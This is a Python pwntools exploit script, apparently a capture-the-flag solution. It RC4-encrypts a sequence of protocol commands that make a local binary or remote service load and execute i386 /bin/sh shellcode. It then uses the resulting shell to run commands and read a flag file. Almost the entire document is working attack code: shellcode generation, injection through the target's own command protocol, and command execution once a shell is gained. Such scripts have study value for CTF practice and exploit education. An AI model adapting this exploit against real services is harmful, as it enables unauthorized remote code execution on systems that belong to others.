from pwn import *

class RC4:

    def __init__(self,public_key = None):
        if not public_key:
            public_key = 'none_public_key'
        self.public_key = public_key
        self.index_i = 0;
        self.index_j = 0;
        self._init_box()
 
    def _init_box(self):


        self.Box = range(256)
        key_length = len(self.public_key)
        j = 0
        for i in range(256):
            index = ord(self.public_key[(i % key_length)])
            j = (j + self.Box[i] + index ) % 256
            self.Box[i],self.Box[j] = self.Box[j],self.Box[i]

    def do_crypt(self,string):
        out = []
        for s in string:
            self.index_i = (self.index_i + 1) % 256
            self.index_j = (self.index_j + self.Box[self.index_i]) % 256
            self.Box[self.index_i], self.Box[self.index_j] = self.Box[self.index_j],  self.Box[self.index_i]

            r = (self.Box[self.index_i] + self.Box[self.index_j]) % 256
            R = self.Box[r]
            out.append(chr(ord(s) ^ R))

        return ''.join(out)

def rc4_encryt(data):
    return RC4('ichunqiu').do_crypt(data)

def exp(local,binary,msg,ip=0,port=0,timeout=1):
	if local:
	    p = process(binary)
	else:
	    p = remote(ip, port,timeout=timeout) 

	try:
		p.recvuntil('\xfd\xc8\xa3\x72\xc7\x5f\x04\xae\x1b\x25\xf4\xce\x2b\x11\x24\x41\xaf\xf3\x84\x5d\xb6\xd4\x63\x04\x28\xde\x66\xc7\x75\x9d\x67\xf8',timeout=timeout)
		shellcode = asm(shellcraft.sh(), arch="i386")

		shellcode_len = len(shellcode)

		p.send(rc4_encryt('00000001'))

		p.send(rc4_encryt(str(shellcode_len).rjust(8, '0')))

		p.send(rc4_encryt(shellcode))

		p.send(rc4_encryt('00000003'))

		p.send(rc4_encryt('00000000'))

		p.sendline('echo 123')
		p.recvuntil('123',timeout=timeout)
		p.sendline(msg)
		p.sendline('echo 456')
		flag = p.recvuntil('456',timeout=timeout).replace('\n','')
		p.close()
		return flag[:-3]

	except:
		p.close()
		return ''

if __name__ == '__main__':
	print exp(True,'bin3','cat flag')

